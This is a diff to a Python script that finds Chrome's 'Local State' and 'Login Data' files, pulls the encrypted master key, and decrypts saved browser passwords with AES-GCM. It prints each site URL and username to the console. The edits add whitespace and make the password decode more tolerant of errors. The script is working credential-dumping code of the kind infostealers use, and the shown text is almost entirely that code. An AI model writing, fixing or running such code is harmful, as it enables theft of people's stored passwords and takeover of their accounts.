@@ -51,6 +51,7 @@ def find_local_state():
         return ""
     
     local_state_path = os.path.join(user_profile, r"AppData\Local\Google\Chrome\User Data\Local State")
+    
     print(f"| [{bcolors.OKGREEN}>{bcolors.ENDC}] Full path to Local State file: [{bcolors.WARNING}"+str(local_state_path)+f"{bcolors.ENDC}]")
     return local_state_path
 
@@ -61,11 +62,13 @@ def find_login_data():
         return ""
     
     login_data_path = os.path.join(user_profile, r"AppData\Local\Google\Chrome\User Data\Default\Login Data")
+    
     print(f"| [{bcolors.OKGREEN}>{bcolors.ENDC}] Full path to Login Data file: [{bcolors.WARNING}"+str(login_data_path)+f"{bcolors.ENDC}]")
     return login_data_path
 
 def get_encrypted_key(local_state_path):
     try:
+    
         with open(local_state_path, 'r', encoding='utf-8') as file:
             local_state = json.load(file)
         encrypted_key = local_state["os_crypt"]["encrypted_key"]
@@ -118,7 +121,7 @@ def login_data_parser(login_data_path, decryption_key):
                 encrypted_password = encrypted_password[15:]
                 
                 cipher = AES.new(decryption_key, AES.MODE_GCM, iv)
-                decrypted_password = cipher.decrypt(encrypted_password).decode('utf-8')
+                decrypted_password = cipher.decrypt(encrypted_password).decode('utf-8', errors='replace')
                 
                 print(f" [{bcolors.OKGREEN}>{bcolors.ENDC}] 🔗 URL: [{bcolors.OKCYAN}" + origin_url + f"{bcolors.ENDC}]")
                 print(f" [{bcolors.OKGREEN}>{bcolors.ENDC}] 👤 Username: [{bcolors.OKCYAN}" + username_value + f"{bcolors.ENDC}]")
